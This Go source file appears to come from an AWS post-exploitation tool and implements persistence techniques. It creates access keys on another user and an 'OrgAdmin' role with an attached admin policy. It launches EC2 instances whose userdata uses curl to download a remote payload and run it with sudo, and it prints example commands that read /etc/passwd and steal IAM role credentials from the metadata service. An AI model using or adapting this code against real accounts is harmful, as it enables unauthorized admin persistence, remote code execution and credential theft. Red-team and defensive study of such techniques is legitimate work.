package awsdata

import (
	"encoding/base64"
	"fmt"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/ec2"
)

//PersistAccessKey creates a new access key on user
func PersistAccessKey(sess *session.Session, username string) {

	//Create new access key on another user
	CreateAccessKey(sess, username)
}

//PersistEC2 creates IAM InstanceProfile / Role w/ admin policy and launches the instance with a payload inside of userdata.
func PersistEC2(sess *session.Session, payload string, ami string) {
	if len(ami) > 0 {
		ami = "ami-013f17f36f8b1fefb"
	}

	profile := &ec2.IamInstanceProfileSpecification{
		Name: aws.String("OrgAdmin"),
	}

	userData := fmt.Sprintf(`#!/bin/bash
	curl %s -o /tmp/run
	cd /tmp
	sudo su ubuntu
	sudo chmod +x run
	sudo ./run &`, payload)

	dataEnc := base64.StdEncoding.EncodeToString([]byte(userData))

	ec2data := &ec2.RunInstancesInput{
		// An Amazon Linux AMI ID for t2.micro instances in the us-west-2 region
		ImageId:            aws.String(ami),
		InstanceType:       aws.String("t2.micro"),
		MinCount:           aws.Int64(1),
		MaxCount:           aws.Int64(1),
		UserData:           aws.String(dataEnc),
		IamInstanceProfile: profile,
	}
	// Create instance profile
	CreateInstanceProfile(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Create role
	CreateRole(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Attach admin policy to newly created role
	AttachRolePolicy(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Add role to the instance profile
	AddRoleToInstanceProfile(sess, "OrgAdmin")
	time.Sleep(5 * time.Second)

	//Create instance with userdata payload
	RunInstance(sess, ec2data)
}

//PersistSSM creates IAM InstanceProfile / Role w/ admin policy and launches the instance with a payload inside of userdata.
func PersistSSM(sess *session.Session, ami string) {

	if len(ami) > 0 {
		ami = "ami-013f17f36f8b1fefb"
	}

	profile := &ec2.IamInstanceProfileSpecification{
		Name: aws.String("OrgAdmin"),
	}

	ec2data := &ec2.RunInstancesInput{
		// An Amazon Linux AMI ID for t2.micro instances in the us-west-2 region
		ImageId:            aws.String(ami),
		InstanceType:       aws.String("t2.micro"),
		MinCount:           aws.Int64(1),
		MaxCount:           aws.Int64(1),
		IamInstanceProfile: profile,
	}

	// Create instance profile
	CreateInstanceProfile(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Create Role
	CreateRole(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Attach admin policy to newly created role
	AttachRolePolicy(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Add role to the instance profile
	AddRoleToInstanceProfile(sess, "OrgAdmin")
	time.Sleep(5 * time.Second)

	//Create new instance and check when status changed to running
	instance := RunInstance(sess, ec2data)
	for {
		status := ec2Status(sess, instance)
		time.Sleep(1 * time.Second)
		if len(status) == 1 {
			break
		}
	}
	time.Sleep(20 * time.Second)

	//Example send-commands
	fmt.Println("Try it: send-command " + instance + " \"cat /etc/passwd\"")
	fmt.Println("Grab Token: send-command " + instance + " \"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/OrgAdmin\"")
}
